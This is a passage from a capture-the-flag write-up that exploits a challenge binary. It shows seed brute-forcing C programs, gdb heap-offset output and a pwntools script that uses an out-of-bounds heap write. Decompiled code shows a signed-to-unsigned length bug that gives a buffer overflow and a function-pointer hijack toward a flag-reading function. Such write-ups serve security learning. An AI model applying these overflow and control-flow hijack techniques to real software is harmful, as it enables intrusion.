</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;FOUND %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Output:
</span></span></span><span class=line><span class=cl><span class=cm>Trying: 1
</span></span></span><span class=line><span class=cl><span class=cm>Trying: 2
</span></span></span><span class=line><span class=cl><span class=cm>...
</span></span></span><span class=line><span class=cl><span class=cm>FOUND 34
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span></code></pre></div><p>We can see that the number 34, is valid for this check. However, how can we modify the value at <strong>level_1_check</strong>?</p><p>If we debug the program, and look at the addresses of the 2 chunks in memory <em>(level_1_check and level_1_allocations)</em></p><pre tabindex=0><code>gef➤  x/2gx 0x00055555555C400
0x55555555c400: 0x000055555556f4a0      0x00005555555704b0
gef➤  pi 0x00005555555704b0 - 0x000055555556f4a0
4112
</code></pre><p>We see that they are 4112 bytes apart. This is less than the <code>4343</code> max bytes that we can write to from <code>level_1_allocations</code>.</p><p>This means that with our level 1 OOB write, we can overwrite the <code>level_1_check</code> with the number <code>34</code> that would allow us to unlock <code>level 3</code>.</p><pre tabindex=0><code>x + (15&lt;&lt;8) + 247 = 4112
x = 25
</code></pre><p>Now we need to find a random seed such that it will give us a random of 25. We can write another c program to brute force this seed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>qq</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>srand</span><span class=p>(</span><span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>x</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>x</span><span class=o>&lt;</span><span class=mi>16</span><span class=p>;</span> <span class=n>x</span><span class=o>+=</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>random</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mi>256</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>random</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nf>qq</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>==</span> <span class=mi>25</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;FOUND %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>OUTPUT:
</span></span></span><span class=line><span class=cl><span class=cm>...
</span></span></span><span class=line><span class=cl><span class=cm>0: 58
</span></span></span><span class=line><span class=cl><span class=cm>1: 87
</span></span></span><span class=line><span class=cl><span class=cm>2: 113
</span></span></span><span class=line><span class=cl><span class=cm>3: 188
</span></span></span><span class=line><span class=cl><span class=cm>4: 68
</span></span></span><span class=line><span class=cl><span class=cm>5: 243
</span></span></span><span class=line><span class=cl><span class=cm>6: 227
</span></span></span><span class=line><span class=cl><span class=cm>7: 35
</span></span></span><span class=line><span class=cl><span class=cm>8: 2
</span></span></span><span class=line><span class=cl><span class=cm>9: 70
</span></span></span><span class=line><span class=cl><span class=cm>10: 117
</span></span></span><span class=line><span class=cl><span class=cm>11: 48
</span></span></span><span class=line><span class=cl><span class=cm>12: 250
</span></span></span><span class=line><span class=cl><span class=cm>13: 167
</span></span></span><span class=line><span class=cl><span class=cm>14: 249
</span></span></span><span class=line><span class=cl><span class=cm>15: 25
</span></span></span><span class=line><span class=cl><span class=cm>FOUND 180
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span></code></pre></div><p>Hence, a seed of 180 will allow us to accurately write to <code>level_1_check</code>.</p><p>At this point we can craft stage 1 of our exploit script, to unlock level 3.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>unlock_level_3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;option: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;seed: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;180&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;here? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;34&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Now if we look at the code for level 3,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>v2</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Welcome to level 3!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;There is actually no level 3 ... &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;All we want you to do is to leave a message behind :D&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v15</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=nf>alloca</span><span class=p>(</span><span class=mi>48LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v6</span> <span class=o>=</span> <span class=nf>alloca</span><span class=p>(</span><span class=mi>48LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v13</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v12</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x28uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>v13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x28uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>sub_555555557B4C</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>v15</span> <span class=o>=</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_WORD</span><span class=p>)</span><span class=n>result</span> <span class=o>!=</span> <span class=mh>0xFFFF</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v7</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Please type your message below.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v8</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v7</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v8</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>istream</span><span class=o>::</span><span class=nf>get</span><span class=p>((</span><span class=n>std</span><span class=o>::</span><span class=n>istream</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cin</span><span class=p>,</span> <span class=n>v13</span><span class=p>,</span> <span class=n>v15</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v9</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Your message is &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v10</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>v9</span><span class=p>,</span> <span class=n>v13</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v10</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>sub_555555557ACD</span><span class=p>(</span><span class=n>v13</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v11</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span>
</span></span><span class=line><span class=cl>              <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s>&#34;Thanks for leaving a message behind! It will be for the next challenger :)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v11</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>istream</span><span class=o>::</span><span class=nf>get</span><span class=p>((</span><span class=n>std</span><span class=o>::</span><span class=n>istream</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>result</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>s</span> <span class=o>+</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>result</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=o>*</span><span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=o>**</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>s</span> <span class=o>+</span> <span class=mi>2</span><span class=p>))();</span><span class=c1>// call_anything??
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>sub_555555557B4C</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>input</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;Input the length of your message: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>input</span> <span class=o>=</span> <span class=nf>get_signed_integer_input</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>input</span> <span class=o>&lt;=</span> <span class=mi>40</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>input</span><span class=p>;</span>                 <span class=c1>// vulnerable to signed -&gt; unsigned int conversion
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>v0</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span>
</span></span><span class=line><span class=cl>         <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;The provided message length exceeds the max length. Exiting this option.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mh>0xFFFFFFFFLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We can see that it prompts us for an input size <em>(which is vulnerable to signed -> unsigned integer conversion)</em> which gives us a buffer overflow.</p><p>It then checks if a variable is initialized, and calls it if it is initialized.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>      <span class=n>result</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>s</span> <span class=o>+</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>result</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=o>*</span><span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=o>**</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>s</span> <span class=o>+</span> <span class=mi>2</span><span class=p>))();</span><span class=c1>// call_anything??
</span></span></span></code></pre></div><p>Thus, with our buffer overflow, we can overwrite this variable, and we will be able to redirect code execution to anywhere we want.</p><p>If we poke around more, we can even find a function that opens, and prints the content of a file <em>(win function?)</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win_</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_QWORD</span> <span class=o>*</span><span class=n>v2</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v3</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-240h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+100h] [rbp-140h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v5</span><span class=p>[</span><span class=mi>40</span><span class=p>];</span> <span class=c1>// [rsp+210h] [rbp-30h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>__cxx11</span><span class=o>::</span><span class=n>basic_string</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;::</span><span class=nf>basic_string</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ifstream</span><span class=o>::</span><span class=nf>basic_ifstream</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;4287e796e9e09f36c2d1a2dd460c0716af4bdac6.txt&#34;</span><span class=p>,</span> <span class=mi>8LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>std</span><span class=o>::</span><span class=n>ios</span><span class=o>::</span><span class=n>operator</span><span class=o>!</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=s>&#34;The file does not exist&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v2</span> <span class=o>=</span> <span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>std</span><span class=o>::</span><span class=n>getline</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>std</span><span class=o>::</span><span class=n>ios</span><span class=o>::</span><span class=n>operator</span> <span class=kt>bool</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>v2</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=n>v2</span> <span class=o>-</span> <span class=mi>24LL</span><span class=p>))</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v1</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
